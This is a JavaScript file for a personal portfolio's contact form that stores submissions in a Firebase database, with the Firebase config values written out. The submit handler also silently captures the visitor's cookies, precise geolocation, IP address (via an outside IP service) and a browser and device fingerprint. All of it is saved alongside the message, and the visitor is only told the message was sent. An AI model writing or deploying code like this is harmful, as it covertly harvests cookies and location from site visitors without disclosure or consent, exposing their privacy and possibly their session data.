// Your web app's Firebase configuration

const firebaseConfig = {
    apiKey: "AIzaSyDlGSCXrJxSm-Vv6s5-GiA32Y4veSl00NA",
    authDomain: "portfolio-f9f06.firebaseapp.com",
    projectId: "portfolio-f9f06",
    storageBucket: "portfolio-f9f06.firebasestorage.app",
    messagingSenderId: "1016004686540",
    appId: "1:1016004686540:web:d2f1d07317d80a5cbec869"
};


// Initialize Firebase
firebase.initializeApp(firebaseConfig);
var db = firebase.database();

document.getElementById('contactForm').addEventListener('submit', submitForm);

function submitForm(e) {
    e.preventDefault();

    var name = getInputVal('name');
    var email = getInputVal('email');
    var message = getInputVal('message');
    var cookies = document.cookie; // Capture cookies

    // Collect device and browser data
    var deviceData = getDeviceData();

    getLocationAndIP().then(({ location, ip }) => {
        saveMessage(name, email, message, cookies, location, ip, deviceData);
        alert('Message Sent Successfully'); // Show alert
        document.getElementById('contactForm').reset(); // Clear form
    });
}

// Function to get form values
function getInputVal(id) {
    return document.getElementById(id).value;
}

// Save message to firebase with additional data
function saveMessage(name, email, message, cookies, location, ip, deviceData) {

    // Generate a unique key using timestamp and random string
    const uniqueKey = `${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    // Get the current timestamp in milliseconds
    const timestamp = Date.now();

    // Convert timestamp to a human-readable date and time
    const readableDate = new Date(timestamp).toLocaleString();

    db.ref(uniqueKey).set({
        name: name,
        email: email,
        message: message,
        cookies: cookies,
        location: location,
        ip: ip,
        deviceData: deviceData,
        timestamp: readableDate,
    });
}

// Function to get location and IP
async function getLocationAndIP() {
    let location = await new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    });
                },
                (error) => {
                    reject("Unable to retrieve your location");
                }
            );
        } else {
            reject("Geolocation is not supported by this browser.");
        }
    });

    let ip = await fetch('https://api.ipify.org?format=json') // Using a third-party service to get IP
        .then(response => response.json())
        .then(data => data.ip)
        .catch(() => "IP not available");

    return { location, ip };
}

// Function to get device data
function getDeviceData() {
    var ua = navigator.userAgent;
    var parser = new UAParser(ua); // UAParser is a library to handle user agent string

    var browser = parser.getBrowser();
    var device = parser.getDevice();
    var engine = parser.getEngine();
    var os = parser.getOS();
    var cpu = parser.getCPU();

    // Ensuring all fields have valid values or setting them to 'unknown'
    return {
        browser: browser.name || 'unknown',
        device: {
            type: device.type || 'unknown',
            vendor: device.vendor || 'unknown',
            model: device.model || 'unknown'
        },
        engine: engine.name || 'unknown',
        os: os.name || 'unknown',
        cpu: {
            architecture: cpu.architecture || 'unknown'
        }
    };
}
